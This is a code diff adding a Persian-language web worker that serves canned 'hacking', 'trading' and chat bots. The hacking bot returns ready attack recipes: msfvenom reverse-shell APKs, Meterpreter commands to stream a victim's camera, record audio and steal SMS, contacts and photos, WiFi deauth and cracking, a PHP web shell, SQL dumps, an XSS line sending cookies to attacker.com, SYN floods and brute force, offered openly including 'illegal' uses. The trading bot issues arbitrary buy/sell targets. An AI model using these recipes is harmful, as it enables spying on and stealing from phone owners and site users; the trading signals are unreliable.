@@ -1,0 +1,470 @@
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request));
+});
+
+async function handleRequest(request) {
+  const url = new URL(request.url);
+  const path = url.pathname;
+
+  if (path === '/' || path === '') return new Response(getMainPage(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
+  if (path === '/hack') return new Response(getHackPage(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
+  if (path === '/hack/chat') {
+    const query = url.searchParams.get('q') || 'سلام';
+    return new Response(JSON.stringify({ response: hackChatResponse(query) }), { headers: { 'Content-Type': 'application/json' } });
+  }
+  if (path === '/trade') return new Response(getTradePage(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
+  if (path === '/trade/chat') {
+    const query = url.searchParams.get('q') || 'تحلیل';
+    return new Response(JSON.stringify({ response: tradeChatResponse(query) }), { headers: { 'Content-Type': 'application/json' } });
+  }
+  if (path === '/chat') return new Response(getChatPage(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
+  if (path === '/chat/chat') {
+    const query = url.searchParams.get('q') || 'سلام';
+    return new Response(JSON.stringify({ response: chatResponse(query) }), { headers: { 'Content-Type': 'application/json' } });
+  }
+  return new Response('404: مسیر پیدا نشد', { status: 404 });
+}
+
+function getMainPage() {
+  return `
+    <!DOCTYPE html>
+    <html lang="fa">
+    <head>
+      <meta charset="UTF-8">
+      <title>اسطوره نجات‌دهنده</title>
+      <style>
+        body { margin: 0; padding: 0; font-family: 'Arial', sans-serif; background: linear-gradient(45deg, #0d1b2a, #1b263b, #415a77); height: 100vh; display: flex; justify-content: center; align-items: center; direction: rtl; overflow: hidden; }
+        .container { text-align: center; background: rgba(0, 0, 0, 0.7); padding: 50px; border-radius: 25px; box-shadow: 0 0 50px rgba(0, 255, 255, 0.5), 0 0 100px rgba(255, 0, 255, 0.3); animation: glow 2s infinite alternate; }
+        h1 { color: #00ffff; font-size: 3em; text-shadow: 0 0 20px #00ffff, 0 0 40px #ff00ff; margin-bottom: 40px; }
+        .button { display: inline-block; padding: 20px 40px; margin: 15px; background: linear-gradient(135deg, #ff00ff, #00ffff); color: #fff; text-decoration: none; border-radius: 15px; font-size: 1.5em; transition: transform 0.3s, box-shadow 0.3s; box-shadow: 0 0 20px rgba(255, 0, 255, 0.7); }
+        .button:hover { transform: scale(1.1); box-shadow: 0 0 40px rgba(0, 255, 255, 0.9); }
+        @keyframes glow { 0% { box-shadow: 0 0 50px rgba(0, 255, 255, 0.5); } 100% { box-shadow: 0 0 50px rgba(255, 0, 255, 0.5); } }
+      </style>
+    </head>
+    <body>
+      <div class="container">
+        <h1>اسطوره نجات‌دهنده</h1>
+        <a href="/hack" class="button">هک اسطوره‌ای</a>
+        <a href="/trade" class="button">ترید اسطوره‌ای</a>
+        <a href="/chat" class="button">چت اسطوره‌ای</a>
+      </div>
+    </body>
+    </html>
+  `;
+}
+
+function getHackPage() {
+  return `
+    <!DOCTYPE html>
+    <html lang="fa">
+    <head>
+      <meta charset="UTF-8">
+      <title>هک اسطوره‌ای</title>
+      <style>
+        body { margin: 0; padding: 20px; font-family: 'Arial', sans-serif; background: #0d1b2a; color: #fff; direction: rtl; min-height: 100vh; }
+        .chat-container { max-width: 1000px; margin: 0 auto; background: rgba(0, 0, 0, 0.8); padding: 30px; border-radius: 20px; box-shadow: 0 0 30px rgba(255, 0, 255, 0.5), inset 0 0 20px rgba(0, 255, 255, 0.3); }
+        h1 { color: #ff00ff; text-shadow: 0 0 15px #ff00ff; font-size: 2.5em; text-align: center; }
+        .input-area { display: flex; gap: 15px; margin-top: 20px; }
+        input { flex: 1; padding: 15px; border: none; border-radius: 10px; background: linear-gradient(135deg, #1b263b, #415a77); color: #fff; font-size: 1.2em; box-shadow: 0 0 10px rgba(0, 255, 255, 0.5); }
+        button { padding: 15px 30px; background: linear-gradient(135deg, #ff00ff, #00ffff); border: none; border-radius: 10px; color: #fff; font-size: 1.2em; cursor: pointer; box-shadow: 0 0 15px rgba(255, 0, 255, 0.7); transition: transform 0.3s; }
+        button:hover { transform: scale(1.05); }
+        #response { margin-top: 30px; padding: 20px; background: rgba(255, 255, 255, 0.05); border-radius: 15px; white-space: pre-wrap; text-align: right; font-size: 1.1em; box-shadow: inset 0 0 20px rgba(0, 255, 255, 0.2); line-height: 1.6; }
+      </style>
+    </head>
+    <body>
+      <div class="chat-container">
+        <h1>هک اسطوره‌ای</h1>
+        <div class="input-area">
+          <input id="query" type="text" placeholder="هر چیزی درباره هک بپرس (گوشی، گالری، شبکه، وب، هر تکنیکی)">
+          <button onclick="sendChat()">ارسال</button>
+        </div>
+        <div id="response"></div>
+      </div>
+      <script>
+        async function sendChat() {
+          const query = document.getElementById('query').value;
+          const res = await fetch('/hack/chat?q=' + encodeURIComponent(query));
+          const data = await res.json();
+          document.getElementById('response').innerText = data.response;
+        }
+      </script>
+    </body>
+    </html>
+  `;
+}
+
+function hackChatResponse(query) {
+  query = query.toLowerCase();
+  if (query.includes('سلام')) return `
+✨ سلام جنگجوی سایبری! ✨
+من اینجام تا هر نوع هک رو از صفر تا 1000 با جزئیات شیک و واضح یادت بدم.
+قانونی یا غیرقانونی (فقط تئوری)، هر چیزی بخوای بگو!
+چی تو ذهنته؟
+  `;
+  else if (query.includes('گوشی') || query.includes('موبایل')) return `
+📱 هک گوشی - از صفر تا 1000 📱
+--------------------------------
+🔹 ساده:
+   - فیشینگ با صفحه جعلی (HTML+PHP، دامنه رایگان مثل .tk، لینک کوتاه با bit.ly).
+🔹 متوسط:
+   - پیلود با msfvenom:
+     "msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -o hack.apk"
+   - اجرا تو Metasploit:
+     "use exploit/android/meterpreter/reverse_tcp" > "set LHOST <your_ip>" > "exploit"
+   - کنترل:
+     - دوربین زنده: "webcam_stream"
+     - ضبط صدا: "record_mic"
+     - پیام‌ها: "dump_sms"
+     - مخاطبین: "dump_contacts"
+🔹 پیشرفته:
+   - Zero-day مثل Stagefright:
+     "use exploit/android/browser/stagefright_mp4_tx3g"
+   - Root با Magisk + تزریق بدافزار.
+🔹 گالری:
+   - "shell" > "find /sdcard/DCIM -name '*.jpg'" (جستجو)
+   - "download <path>" (دانلود)
+   - "rm <path>" (حذف)
+🔹 غیرقانونی (تئوری):
+   - تزریق پیلود تو اپلیکیشن محبوب با APKTool، پخش تو مارکت غیررسمی.
+🔹 دفاع:
+   - رمزنگاری AES، قفل bootloader، آنتی‌ویروس، آپدیت سیستم.
+--------------------------------
+هر بخش رو بیشتر بخوای، بگو!
+  `;
+  else if (query.includes('گالری')) return `
+🖼️ هک گالری گوشی - شیک و کامل 🖼️
+--------------------------------
+🔹 دسترسی:
+   - پیلود: "msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -o gallery.apk"
+   - Metasploit: "use exploit/android/meterpreter/reverse_tcp" > "exploit"
+🔹 جستجو:
+   - "shell" > "find /sdcard/DCIM -name '*.jpg'" (عکس‌ها)
+   - "find /sdcard/Pictures" (گالری اضافی)
+🔹 دانلود:
+   - "download /sdcard/DCIM/Camera/photo.jpg"
+🔹 حذف:
+   - "rm /sdcard/DCIM/Camera/photo.jpg"
+🔹 پیشرفته:
+   - آپلود بدافزار: "upload <malware.apk>"
+   - رمزنگاری فایل‌ها: "openssl enc -aes-256-cbc -in photo.jpg -out photo.enc"
+🔹 دفاع:
+   - محدود کردن دسترسی گالری (Permissions)، رمزنگاری حافظه.
+--------------------------------
+چیزی بیشتر می‌خوای؟
+  `;
+  else if (query.includes('شبکه') || query.includes('وای‌فای')) return `
+🌐 هک شبکه و وای‌فای - از صفر تا 1000 🌐
+--------------------------------
+🔹 ساده:
+   - اسکن: "nmap -sn 192.168.1.0/24"
+🔹 وای‌فای:
+   - آماده‌سازی: "airmon-ng start wlan0"
+   - اسکن: "airodump-ng wlan0mon"
+   - قطع: "aireplay-ng --deauth 10 -a <BSSID>"
+   - رمز: "aircrack-ng <cap_file> -w <wordlist>"
+🔹 متوسط:
+   - ARP Spoofing: "ettercap -T -M arp:remote /<target_ip>/ /<gateway_ip>/"
+🔹 پیشرفته:
+   - KRACK Attack: ابزار krackattacks-scripts
+   - Evil Twin AP: "hostapd" برای هات‌اسپات جعلی
+🔹 غیرقانونی (تئوری):
+   - شنود دائمی با بات‌نت، Deauth Flood
+🔹 دفاع:
+   - WPA3، VPN، فیلتر MAC، فایروال
+--------------------------------
+هر بخش رو باز کنم؟
+  `;
+  else if (query.includes('وب') || query.includes('سایت')) return `
+🌍 هک وب‌سایت - شیک و حرفه‌ای 🌍
+--------------------------------
+🔹 ساده:
+   - XSS: "<script>alert('hacked')</script>"
+🔹 متوسط:
+   - SQL Injection: "sqlmap -u <url> --dbs" > "sqlmap -u <url> -D <db> -T <table> --dump"
+🔹 پیشرفته:
+   - شل: "echo '<?php system($_GET['cmd']); ?>' > shell.php"
+   - RCE: "curl -d 'cmd=whoami' <url>/shell.php"
+🔹 حرفه‌ای:
+   - LFI: "../../etc/passwd"
+   - CSRF: تغییر رمز ادمین
+🔹 غیرقانونی (تئوری):
+   - DDoS با LOIC، Deface انبوه
+🔹 دفاع:
+   - WAF (Cloudflare)، HTTPS، CSP
+--------------------------------
+جزئیات بیشتر؟
+  `;
+  else if (query.includes('دفاع') || query.includes('امنیت')) return `
+🛡️ دفاع در برابر هک - کامل و شیک 🛡️
+--------------------------------
+🔹 ساده:
+   - رمز قوی (20 کاراکتر)، 2FA
+🔹 متوسط:
+   - فایروال: "iptables -A INPUT -p tcp --dport 22 -j DROP"
+   - Fail2ban ضد Brute Force
+🔹 پیشرفته:
+   - Honeypot: Cowrie
+   - IDS: Snort
+   - رمزنگاری SSH
+🔹 حرفه‌ای:
+   - مانیتورینگ: Wireshark
+   - بلاک IP: "iptables -A INPUT -s <hacker_ip> -j DROP"
+🔹 دفاع از غیرقانونی:
+   - OSINT برای ردیابی، گزارش به پلیس
+--------------------------------
+چیزی کمه؟
+  `;
+  else if (query.includes('فیشینگ')) return `
+🎣 فیشینگ - از صفر تا 1000 🎣
+--------------------------------
+🔹 ساده:
+   - صفحه جعلی HTML (ورود اینستا)، دامنه .tk
+🔹 متوسط:
+   - SET: "setoolkit > 1 > 2 > 3"، لینک با bit.ly
+🔹 پیشرفته:
+   - HTTPS با Let’s Encrypt
+   - ایمیل جعلی: "sendmail -f <fake@email> <target>"
+🔹 حرفه‌ای:
+   - Spear Phishing با OSINT
+🔹 غیرقانونی (تئوری):
+   - فیشینگ انبوه با بات‌نت
+🔹 دفاع:
+   - DKIM/SPF، آموزش کاربر
+--------------------------------
+بیشتر بگم؟
+  `;
+  else if (query.includes('sql') || query.includes('دیتابیس')) return `
+💾 هک دیتابیس با SQL Injection 💾
+--------------------------------
+🔹 ساده:
+   - "' OR 1=1 --"
+🔹 متوسط:
+   - "sqlmap -u <url> --dbs" > "sqlmap -u <url> -D <db> --dump"
+🔹 پیشرفته:
+   - Blind SQL: "sqlmap -u <url> --technique=B"
+   - Union: "SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3"
+🔹 حرفه‌ای:
+   - دامپ پسورد: "sqlmap --passwords"
+🔹 غیرقانونی (تئوری):
+   - فروش دیتا تو دارک‌وب
+🔹 دفاع:
+   - Prepared Statements، ORM
+--------------------------------
+چیزی دیگه؟
+  `;
+  else if (query.includes('xss')) return `
+⚡ هک با XSS - شیک و واضح ⚡
+--------------------------------
+🔹 ساده:
+   - "<script>alert('hacked')</script>"
+🔹 متوسط:
+   - "<img src=x onerror=alert('hacked')>"
+   - "<iframe src=malware.js>"
+🔹 پیشرفته:
+   - دزدی کوکی: "fetch('https://attacker.com?cookie='+document.cookie)"
+   - تزریق DOM
+🔹 حرفه‌ای:
+   - XSS ماندگار تو دیتابیس
+🔹 غیرقانونی (تئوری):
+   - پخش بدافزار انبوه
+🔹 دفاع:
+   - CSP، encode خروجی
+--------------------------------
+بیشتر یاد بگیری؟
+  `;
+  else if (query.includes('ddos') || query.includes('حمله')) return `
+💥 حملات DDoS - از صفر تا 1000 💥
+--------------------------------
+🔹 ساده:
+   - پینگ: "ping -t <ip> -l 65500"
+🔹 متوسط:
+   - SYN Flood: "hping3 -S -p 80 --flood <ip>"
+🔹 پیشرفته:
+   - بات‌نت: Mirai (تئوری)
+   - Slowloris
+🔹 حرفه‌ای:
+   - Amplification با NTP/DNS
+🔹 غیرقانونی:
+   - حملات تجاری
+🔹 دفاع:
+   - Cloudflare، Rate Limiting
+--------------------------------
+جزئیات بیشتر؟
+  `;
+  else if (query.includes('رمز') || query.includes('پسورد')) return `
+🔑 هک رمز - کامل و شیک 🔑
+--------------------------------
+🔹 ساده:
+   - حدس: "123456"، "admin"
+🔹 متوسط:
+   - Brute Force: "hydra -l admin -P <wordlist> <ip> ssh"
+🔹 پیشرفته:
+   - Keylogger: "msfvenom -p windows/meterpreter/reverse_tcp -f exe > keylog.exe"
+🔹 حرفه‌ای:
+   - Rainbow Table با hashcat
+🔹 غیرقانونی (تئوری):
+   - دزدی رمز انبوه
+🔹 دفاع:
+   - رمز پیچیده، 2FA، bcrypt
+--------------------------------
+چیزی کمه؟
+  `;
+  else return `
+🌟 من اسطوره هک‌ام! 🌟
+هر نوع هک از صفر تا 1000، شیک و واضح:
+--------------------------------
+🔹 گوشی: فیشینگ، گالری، کنترل
+🔹 شبکه: وای‌فای، ARP، MitM
+🔹 وب: XSS، SQLi، شل، DDoS
+🔹 دفاع: فایروال، Honeypot
+🔹 تکنیک‌ها: فیشینگ، Keylogger، Brute Force
+--------------------------------
+هر چیزی که فکرشو بکنی یادت می‌دم!
+چی می‌خوای؟ (مثلاً "هک گالری"، "هک رمز")
+  `;
+}
+
+function getTradePage() {
+  return `
+    <!DOCTYPE html>
+    <html lang="fa">
+    <head>
+      <meta charset="UTF-8">
+      <title>ترید اسطوره‌ای</title>
+      <style>
+        body { margin: 0; padding: 20px; font-family: 'Arial', sans-serif; background: #1a1a2e; color: #fff; direction: rtl; min-height: 100vh; }
+        .chat-container { max-width: 1000px; margin: 0 auto; background: rgba(0, 0, 0, 0.8); padding: 30px; border-radius: 20px; box-shadow: 0 0 30px rgba(0, 255, 255, 0.5); }
+        h1 { color: #00ffff; text-shadow: 0 0 15px #00ffff; font-size: 2.5em; text-align: center; }
+        .input-area { display: flex; gap: 15px; margin-top: 20px; }
+        input { flex: 1; padding: 15px; border: none; border-radius: 10px; background: linear-gradient(135deg, #16213e, #415a77); color: #fff; font-size: 1.2em; }
+        button { padding: 15px 30px; background: linear-gradient(135deg, #00ffff, #00b894); border: none; border-radius: 10px; color: #fff; font-size: 1.2em; cursor: pointer; box-shadow: 0 0 15px rgba(0, 255, 255, 0.7); }
+        button:hover { transform: scale(1.05); }
+        #response { margin-top: 30px; padding: 20px; background: rgba(255, 255, 255, 0.05); border-radius: 15px; white-space: pre-wrap; text-align: right; font-size: 1.1em; }
+      </style>
+    </head>
+    <body>
+      <div class="chat-container">
+        <h1>ترید اسطوره‌ای</h1>
+        <div class="input-area">
+          <input id="query" type="text" placeholder="داده کندل بده (مثلاً: 100,105,110,95)">
+          <button onclick="sendChat()">ارسال</button>
+        </div>
+        <div id="response"></div>
+      </div>
+      <script>
+        async function sendChat() {
+          const query = document.getElementById('query').value;
+          const res = await fetch('/trade/chat?q=' + encodeURIComponent(query));
+          const data = await res.json();
+          document.getElementById('response').innerText = data.response;
+        }
+      </script>
+    </body>
+    </html>
+  `;
+}
+
+function tradeChatResponse(query) {
+  if (query.match(/\d+/g)) {
+    const numbers = query.match(/\d+/g).map(Number);
+    if (numbers.length >= 4) {
+      const [open, close, high, low] = numbers.slice(0, 4);
+      let advice = `📈 تحلیل اسطوره‌ای کندل 📈\n--------------------------------\n`;
+      advice += `🔹 داده‌ها: باز: ${open} | بسته: ${close} | بالا: ${high} | پایین: ${low}\n`;
+      const body = Math.abs(close - open);
+      const upperShadow = high - Math.max(open, close);
+      const lowerShadow = Math.min(open, close) - low;
+      if (close > open) {
+        advice += `🔹 روند: صعودی\n`;
+        if (body > upperShadow && body > lowerShadow && upperShadow < body * 0.1) {
+          advice += `🔹 الگو: Marubozu صعودی (قدرت بی‌نهایت)\n`;
+          advice += `🔹 پیشنهاد: خرید قوی، استاپ‌لاس ${low - 5}، تارگت ${high + 20}\n`;
+        } else if (upperShadow > body) {
+          advice += `🔹 الگو: Shooting Star (هشدار بازگشت)\n`;
+          advice += `🔹 پیشنهاد: خرید محتاط، استاپ‌لاس ${low}، تارگت ${high + 5}\n`;
+        } else if (lowerShadow > body) {
+          advice += `🔹 الگو: Hammer (شروع صعود)\n`;
+          advice += `🔹 پیشنهاد: خرید، استاپ‌لاس ${low - 3}، تارگت ${high + 10}\n`;
+        } else {
+          advice += `🔹 الگو: صعودی استاندارد\n`;
+          advice += `🔹 پیشنهاد: خرید، استاپ‌لاس ${low}، تارگت ${high + 10}\n`;
+        }
+        advice += `🔹 مدیریت مالی: 2% ریسک، سود رو تو 15% قفل کن.\n`;
+      } else if (close < open) {
+        advice += `🔹 روند: نزولی\n`;
+        if (body > upperShadow && body > lowerShadow && lowerShadow < body * 0.1) {
+          advice += `🔹 الگو: Marubozu نزولی (قدرت بالا)\n`;
+          advice += `🔹 پیشنهاد: فروش قوی، استاپ‌لاس ${high + 5}، تارگت ${low - 20}\n`;
+        } else if (lowerShadow > body) {
+          advice += `🔹 الگو: Hanging Man (هشدار بازگشت)\n`;
+          advice += `🔹 پیشنهاد: فروش محتاط، استاپ‌لاس ${high}، تارگت ${low - 5}\n`;
+        } else if (upperShadow > body) {
+          advice += `🔹 الگو: Gravestone Doji (پایان نزول)\n`;
+          advice += `🔹 پیشنهاد: فروش، استاپ‌لاس ${high + 3}، تارگت ${low - 10}\n`;
+        } else {
+          advice += `🔹 الگو: نزولی استاندارد\n`;
+          advice += `🔹 پیشنهاد: فروش، استاپ‌لاس ${high}، تارگت ${low - 10}\n`;
+        }
+        advice += `🔹 مدیریت مالی: 2% ریسک، سود رو سریع بردار.\n`;
+      } else {
+        advice += `🔹 روند: خنثی\n`;
+        advice += `🔹 الگو: Doji (عدم تصمیم)\n`;
+        advice += `🔹 پیشنهاد: صبر کن، جهت بعدی رو ببین.\n`;
+        advice += `🔹 مدیریت مالی: دست نگه دار تا سیگنال قوی.\n`;
+      }
+      advice += `--------------------------------`;
+      return advice;
+    }
+    return 'داده کامل بده (مثلاً: 100,105,110,95 برای باز، بسته، بالا، پایین)';
+  }
+  return 'داده کندل بده (مثلاً: 100,105,110,95) تا اسطوره‌ای تحلیل کنم!';
+}
+
+function getChatPage() {
+  return `
+    <!DOCTYPE html>
+    <html lang="fa">
+    <head>
+      <meta charset="UTF-8">
+      <title>یارا - اسطوره راهنما</title>
+      <style>
+        body { margin: 0; padding: 20px; font-family: 'Arial', sans-serif; background: #2d3436; color: #fff; direction: rtl; min-height: 100vh; }
+        .chat-container { max-width: 1000px; margin: 0 auto; background: rgba(0, 0, 0, 0.8); padding: 30px; border-radius: 20px; box-shadow: 0 0 30px rgba(255, 0, 255, 0.5); }
+        h1 { color: #ff00ff; text-shadow: 0 0 15px #ff00ff; font-size: 2.5em; text-align: center; }
+        .input-area { display: flex; gap: 15px; margin-top: 20px; }
+        input { flex: 1; padding: 15px; border: none; border-radius: 10px; background: linear-gradient(135deg, #636e72, #415a77); color: #fff; font-size: 1.2em; }
+        button { padding: 15px 30px; background: linear-gradient(135deg, #ff00ff, #0984e3); border: none; border-radius: 10px; color: #fff; font-size: 1.2em; cursor: pointer; box-shadow: 0 0 15px rgba(255, 0, 255, 0.7); }
+        button:hover { transform: scale(1.05); }
+        #response { margin-top: 30px; padding: 20px; background: rgba(255, 255, 255, 0.05); border-radius: 15px; white-space: pre-wrap; text-align: right; font-size: 1.1em; }
+      </style>
+    </head>
+    <body>
+      <div class="chat-container">
+        <h1>یارا - اسطوره راهنما</h1>
+        <div class="input-area">
+          <input id="query" type="text" placeholder="هر سوالی داری بپرس، اسطوره‌ای جواب می‌دم">
+          <button onclick="sendChat()">ارسال</button>
+        </div>
+        <div id="response"></div>
+      </div>
+      <script>
+        async function sendChat() {
+          const query = document.getElementById('query').value;
+          const res = await fetch('/chat/chat?q=' + encodeURIComponent(query));
+          const data = await res.json();
+          document.getElementById('response').innerText = data.response;
+        }
+      </script>
+    </body>
+    </html>
+  `;
+}
+
+function chatResponse(query) {
+  const name = 'یارا';
+  if (query.includes('سلام')) return `${name}: سلام قهرمان! من اسطوره راهنماتم، چطور دنیا رو نجات بدیم؟`;
+  else if (query.includes('هک')) return `${name}: هک اسطوره‌ای می‌خوای؟ هر چیزی از گوشی تا سرور، ساده تا غیرقانونی، بگو چی می‌خوای یاد بگیری!`;
+  else if (query.includes('ترید')) return `${name}: ترید اسطوره‌ای؟ داده بده، تحلیل بی‌نظیر می‌دم!`;
+  else if (query.includes('نجات')) return `${name}: نجات دنیا؟ بگو از کجا شروع کنیم، من باهاتم تا آخر خط!`;
+  else return `${name}: هر سوالی داری، اسطوره‌ای جواب می‌دم! چی تو ذهنته؟`;
+}
